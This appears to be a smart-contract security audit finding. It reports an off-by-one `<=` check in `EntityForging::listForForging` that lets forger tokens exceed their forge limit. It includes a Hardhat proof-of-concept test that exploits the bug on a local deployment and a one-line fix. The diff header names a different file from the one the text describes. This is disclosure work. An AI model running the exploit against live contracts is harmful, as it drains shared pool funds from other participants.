# Vulnerability details


## Description & Impact
In the `EntityForging::listForForging` contract, line 88 contains a require statement: `forgePotential > 0 && forgingCounts[tokenId] <= forgePotential`. The use of `<=` is incorrect and should be `<`, allowing forgers to forge `forgePotential + 1` times instead of the intended `forgePotential` times. The logic is correct for mergers, as they can forge with a forger `forgePotential` times.

Here is the corresponding sentence in the official whitepaper: "Forge Potential dictates how many times an Entity can forge before becoming infertile for the rest of the year".

The issue arises because the require statement checks the `forgePotential` value before forging, so the value increments after forging, causing the forger's `forgePotential` to exceed its maximum value.

The impact of this issue is high because:

1. **Forgers are Limited**: According to the whitepaper, Forgers are half of Mergers. Since both Forgers and their forgePotential are limited, the total number of forging processes is supposed to be limited.
2. **Economic Impact on `NukeFund`**: Minting tokens through `TraitForgeNft::mintToken` forwards 90% of the minting fee to the `NukeFund` contract. In contrast, minting tokens via `EntityForging::forgeWithListed` forwards only 10% of the received amount to `NukeFund`.

As a result, this bug increases the number of forging times, which in turn increases the number of tokens minted via forging. This leads to a higher ratio of tokens minted by forging compared to tokens minted by `TraitForgeNft::mintToken`. Consequently, the number of tokens grows at a much higher rate than the balance of the pool, causing an imbalance in the `NukeFund` contract during the nuke process and potentially leading to the protocol stopping in early generations, contrary to the whitepaper's expectation that the game will continue until the 10th generation.

## Proof of Concept
Create a test file in the test directory of the project (`$ touch test/auditForgePotentialExceed.test.ts`), paste the code below, and run `npx hardhat test test/auditForgePotentialExceed.test.ts`:

```javascript
import {
  Airdrop,
  DevFund,
  EntityForging,
  EntropyGenerator,
  TraitForgeNft,
  NukeFund,
} from '../typechain-types';
import { HardhatEthersSigner } from '@nomicfoundation/hardhat-ethers/signers';
import generateMerkleTree from '../scripts/genMerkleTreeLib';

import { fastForward } from '../utils/evm';

const { expect } = require('chai');
const { ethers } = require('hardhat');

const forgerForgePotential = 3;

describe('EntityForging', () => {
  let entityForging: EntityForging;
  let nft: TraitForgeNft;
  let owner: HardhatEthersSigner;
  let userForger: HardhatEthersSigner;
  let userMerger: HardhatEthersSigner;
  let devFund: DevFund;
  let nukeFund: NukeFund;
  let forgerTokenId: number;
  let mergerTokenId: number;

  before(async () => {
    [owner, userForger, userMerger] = await ethers.getSigners();

    // Deploy TraitForgeNft contract
    const TraitForgeNft = await ethers.getContractFactory('TraitForgeNft');
    nft = (await TraitForgeNft.deploy()) as TraitForgeNft;

    // Deploy Airdrop contract
    const airdropFactory = await ethers.getContractFactory('Airdrop');
    const airdrop = (await airdropFactory.deploy()) as Airdrop;

    await nft.setAirdropContract(await airdrop.getAddress());

    await airdrop.transferOwnership(await nft.getAddress());

    // Deploy EntityForging contract
    const EntropyGenerator = await ethers.getContractFactory(
      'EntropyGenerator'
    );
    const entropyGenerator = (await EntropyGenerator.deploy(
      await nft.getAddress()
    )) as EntropyGenerator;

    await entropyGenerator.writeEntropyBatch1();

    await nft.setEntropyGenerator(await entropyGenerator.getAddress());

    // Deploy EntityForging contract
    const EntityForging = await ethers.getContractFactory('EntityForging');
    entityForging = (await EntityForging.deploy(
      await nft.getAddress()
    )) as EntityForging;
    await nft.setEntityForgingContract(await entityForging.getAddress());

    devFund = await ethers.deployContract('DevFund');
    await devFund.waitForDeployment();

    const NukeFund = await ethers.getContractFactory('NukeFund');

    nukeFund = (await NukeFund.deploy(
      await nft.getAddress(),
      await airdrop.getAddress(),
      await devFund.getAddress(),
      owner.address
    )) as NukeFund;
    await nukeFund.waitForDeployment();

    await nft.setNukeFundContract(await nukeFund.getAddress());
  });

  describe('mint suitable tokens', () => {
    it('increase time', async () => {
      // forward time for 1 days to pass onlyWhitelisted modifier
      await fastForward(24 * 60 * 60);
    });

    it('mint NFT for forger with forgePotential = forgerForgePotential', async () => {
      while (true) {
        const trx = await nft.connect(userForger).mintToken([], {
          value: ethers.parseEther('1'),
        });
        const receipt = await trx.wait(1);

        const tokenId = Number(receipt?.logs[0].topics[3].toString());
        const tokenEntropy = Number(await nft.getTokenEntropy(tokenId));
        const isForger = tokenEntropy % 3 == 0;
        const forgePotential = Math.floor(tokenEntropy / 10) % 10;

        if (isForger && forgePotential == forgerForgePotential) {
          console.log(
            `Forger minted NFT (tokenId: ${tokenId})(tokenEntropy: ${tokenEntropy})(forgePotential: ${forgePotential})(isForger: ${isForger})`
          );
          forgerTokenId = tokenId;
          break;
        }
      }
    });

    it('mint NFT for merger with forgePotential > forgerForgePotential', async () => {
      while (true) {
        const trx = await nft.connect(userMerger).mintToken([], {
          value: ethers.parseEther('1'),
        });
        const receipt = await trx.wait(1);

        const tokenId = Number(receipt?.logs[0].topics[3].toString());
        const tokenEntropy = Number(await nft.getTokenEntropy(tokenId));
        const isForger = tokenEntropy % 3 == 0;
        const forgePotential = Math.floor(tokenEntropy / 10) % 10;

        if (!isForger && forgePotential > forgerForgePotential) {
          console.log(
            `Merger minted NFT (tokenId: ${tokenId})(tokenEntropy: ${tokenEntropy})(forgePotential: ${forgePotential})(isForger: ${isForger})`
          );
          mergerTokenId = tokenId;
          break;
        }
      }
    });
  });

  describe('List & Forge & Nuke token', () => {
    const FORGING_FEE = ethers.parseEther('0.01');
    let generatedTokenIdsInForging: any = [];

    const forgerListTokenForForging = async () => {
      await entityForging
        .connect(userForger)
        .listForForging(forgerTokenId, FORGING_FEE);

      const listedTokenId = await entityForging.listedTokenIds(forgerTokenId);
      const listing = await entityForging.listings(listedTokenId);
      expect(listing.isListed).to.be.true;
    };

    const mergerForgeWithListedToken = async () => {
      let listedTokenId = await entityForging.listedTokenIds(forgerTokenId);
      let listing = await entityForging.listings(listedTokenId);
      expect(listing.isListed).to.be.true;

      let trx = await entityForging
        .connect(userMerger)
        .forgeWithListed(forgerTokenId, mergerTokenId, {
          value: FORGING_FEE,
        });
      let receipt = await trx.wait(1);

      let generatedTokenId = Number(receipt?.logs[0].topics[3].toString());
      generatedTokenIdsInForging.push(generatedTokenId);

      listing = await entityForging.listings(listedTokenId);
      expect(listing.isListed).to.be.false;
    };

    it('Forger: forging times exceeds forgePotential', async () => {
      const forgeTimes = forgerForgePotential + 1;

      for (let i = 1; i <= forgeTimes; ++i) {
        await forgerListTokenForForging();
        await mergerForgeWithListedToken();
        console.log('Merger forged with the Forger.');
      }

      console.log(`
            forging times exceeds.
            Forger forgePotential: ${forgerForgePotential}
            Merger forged with the Forger ${forgeTimes} times
            generatedTokenIdsInForging: ${generatedTokenIdsInForging}
        `);
    });

    it('Nuke the last minted token', async () => {
      let tokenToNuck =
        generatedTokenIdsInForging[generatedTokenIdsInForging.length - 1]; // the last token minted
      expect(await nukeFund.canTokenBeNuked(tokenToNuck)).to.be.false;

      // forward time for minimumDaysHeld (3 days) to nuke the token
      let nukeFundMinimumDaysHeld = Number(await nukeFund.minimumDaysHeld());
      await fastForward(nukeFundMinimumDaysHeld);

      expect(await nukeFund.canTokenBeNuked(tokenToNuck)).to.be.true;

      const mergerEthBalance = await ethers.provider.getBalance(
        userMerger.address
      );
      await nft
        .connect(userMerger)
        .approve(await nukeFund.getAddress(), tokenToNuck);

      await expect(nukeFund.connect(userMerger).nuke(tokenToNuck))
        .to.emit(nukeFund, 'Nuked')
        .to.emit(nukeFund, 'FundBalanceUpdated');

      let mergerEthBalanceChange =
        (await ethers.provider.getBalance(userMerger.address)) -
        mergerEthBalance;

      console.log(`
            final minted token nuked during forging process:
            Forger receives: ${(0.9 * Number(FORGING_FEE)) / 1e18}
            NukeFund contract receives: ${(0.1 * Number(FORGING_FEE)) / 1e18}
            Merger spent: ${Number(FORGING_FEE) / 1e18}
            Merger receives: ${Number(mergerEthBalanceChange) / 1e18}
            Merger income: ${
              Number(mergerEthBalanceChange - FORGING_FEE) / 1e18
            }
        `);
    });
  });
});

```

In the tests, `forgerForgePotential` is the forgePotential of the forger selected during the test and is a value between 0 to 9. By running the test for different values, we can see that the corresponding bug leads to significant profit for both Merger and Forger and the withdrawal of more than the expected amount from the pool.

## Recommended Mitigation Steps

Use `<` instead of `<=` in the require statement on line 88:

```diff
File: ./contracts/TraitForgeNft/TraitForgeNft.sol::mintWithBudget

 87    require(
-88      forgePotential > 0 && forgingCounts[tokenId] <= forgePotential,
+        forgePotential > 0 && forgingCounts[tokenId] < forgePotential,
 89      'Entity has reached its forging limit'
 90    );
```
